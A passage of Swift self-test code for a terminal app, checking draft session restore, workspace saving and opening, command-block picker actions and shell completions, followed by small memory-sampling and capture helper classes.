           let restoredTabs = try? JSONDecoder().decode([TerminalWindowController.SavedTab].self, from: data),
           case let .split(_, children, _)? = restoredTabs.first?.layout,
           case let .pane(cwd, _, draft)? = children.first,
           case let .pane(_, _, secretDraft)? = children.last {
            check("draft snapshots omit recognized secrets", secretDraft == nil)
            let restored = TerminalWindowController(
                tabs: [.init(layout: .pane(cwd: cwd, draft: draft))],
                selected: 0, frame: nil)
            let editor = restored.allPanes.first?.editor
            check("session restore returns the multiline draft and cursor",
                  editor?.string == draftText && editor?.selectedRange().location == 10)
            restored.forceClose()
        } else {
            check("session draft snapshots decode", false)
        }

        let oldLayout = Data(#"{"pane":{"cwd":"/tmp"}}"#.utf8)
        let decodedLegacy = try? JSONDecoder().decode(TerminalWindowController.Layout.self, from: oldLayout)
        if case .pane(cwd: "/tmp", session: nil, draft: nil)? = decodedLegacy {
            check("session layouts written before drafts still open", true)
        } else {
            check("session layouts written before drafts still open", false)
        }

        let workspace = wc.workspaceSnapshot(named: "Workspace Fixture")
        let workspaceURL = URL(fileURLWithPath: tmp).appendingPathComponent("workspace-selftest.json")
        do {
            try TerminalWindowController.Workspace.save([workspace], to: workspaceURL)
            wc.showWorkspaces(for: pane, from: workspaceURL)
            if let picker = openPicker() {
                picker.setQuery("workspace fixture")
                check("saved workspace can be found by name", picker.itemTitles == [workspace.name])
                ok = await wait(2) { picker.previewString.contains("Side by side") && picker.previewString.contains("anser-selftest") }
                check("workspace previews its split and folders", ok)
                picker.selectedActionsMenu().performActionForItem(at: 0)
                let pinned = try TerminalWindowController.Workspace.load(from: workspaceURL).first
                check("workspace pin persists", pinned?.pinned == true)
                picker.acceptSelectedForTest()
                let opened = AppDelegate.shared.currentController
                check("workspace opens its split and folders in a new window with fresh shells",
                      opened !== wc && opened?.allPanes.count == 2
                        && opened?.allPanes.allSatisfy { $0.session.cwd == tmp && $0.editor.string.isEmpty && $0.session.id != s.id } == true)
                if let opened, opened !== wc {
                    let count = AppDelegate.shared.tabWindows.count
                    wc.window?.makeKeyAndOrderFront(nil)
                    wc.openWorkspace(workspace.name, from: workspaceURL)
                    ok = await wait(3) { NSApp.keyWindow === opened.window }
                    check("opening a live workspace focuses it without creating a duplicate",
                          ok && AppDelegate.shared.tabWindows.count == count)
                    let recent = try TerminalWindowController.Workspace.load(from: workspaceURL).first
                    check("opening a workspace records it as recent", recent?.lastOpened != nil)
                    opened.forceClose()
                }
            } else {
                check("workspace picker opens", false)
            }
        } catch {
            check("workspace saves", false, error.localizedDescription)
        }
        wc.window?.makeKeyAndOrderFront(nil)
        pane.editor.setCommand(previousText)
        pane.editor.setSelectedRange(previousSelection)
        wc.close(second)
        check("closing a split leaves one pane", wc.allPanes.count == 1)

        // Pickers.
        wc.showBlocks(for: pane)
        ok = await wait(3) { NSApp.windows.contains { $0 is PickerPanel && $0.isVisible } }
        check("command blocks panel opens", ok)
        if let blocks = openPicker(), let command = blocks.itemTitles.first {
            let actions = blocks.selectedActionsMenu()
            check("selected command block offers keyboard-accessible actions",
                  blocks.footerHint.contains("⌃⏎ Actions") && blocks.buttonTitles.contains("Actions…")
                    && actions.items.map(\.title).starts(with: ["Copy Output", "Copy Command", "Edit & Retry", "Save to Notebook"]))
            if let edit = actions.items.firstIndex(where: { $0.title == "Edit & Retry" }) {
                actions.performActionForItem(at: edit)
                check("Edit & Retry stages the selected command", pane.editor.string == command)
                pane.editor.clear()
            }
        }
        closePickers()

        // Completion sources.
        let r = await Services.shared.engine.complete(CompletionContext(line: "git chec", cursor: 8, cwd: s.cwd), env: s.env)
        check("git completion in live session", r.first?.insert == "checkout")
        let ls = await Services.shared.engine.complete(CompletionContext(line: "ls -", cursor: 4, cwd: s.cwd), env: s.env)
        check("ls flags read from its man page", ls.count >= 10, "\(ls.count) flags")
    }
}

/// Keeps the highest memory seen (sampled every 0.1 s on a background thread).
final class MemorySampler: @unchecked Sendable {
    private var peak: UInt64 = 0
    private let lock = NSLock()
    init() {
        let t = Thread { [weak self] in
            while self != nil {
                let now = MemoryUse.footprint().current
                self?.lock.withLock { if now > self!.peak { self!.peak = now } }
                Thread.sleep(forTimeInterval: 0.1)
            }
        }
        t.start()
    }
    /// The peak since the last call.
    func takePeak() -> UInt64 { lock.withLock { let p = peak; peak = 0; return p } }
}

/// Samples memory every 0.1 s: before, the highest while running, and after.
final class MemoryProbe {
    private let before = MemoryUse.footprint().current
    private var peak: UInt64 = 0
    private var timer: Timer?
    init() {
        timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in
            guard let self else { return }
            self.peak = max(self.peak, MemoryUse.footprint().current)
        }
    }
    func finish() -> String {
        timer?.invalidate()
        let after = MemoryUse.footprint().current
        MemoryUse.releaseFreed()
        let released = MemoryUse.footprint().current
        return "before \(MemoryUse.megabytes(before)) · peak \(MemoryUse.megabytes(peak)) · after \(MemoryUse.megabytes(after)) · after giving back \(MemoryUse.megabytes(released))"
    }
}

final class SentBodies: @unchecked Sendable {
    private var bodies: [String] = []
    private let lock = NSLock()
    func add(_ b: String) { lock.withLock { bodies.append(b) } }
    var all: [String] { lock.withLock { bodies } }
}


final class ArgsCapture: @unchecked Sendable {
    private var v: [String] = []
    private let l = NSLock()
    func set(_ a: [String]) { l.withLock { v = a } }
    func get() -> [String] { l.withLock { v } }
}
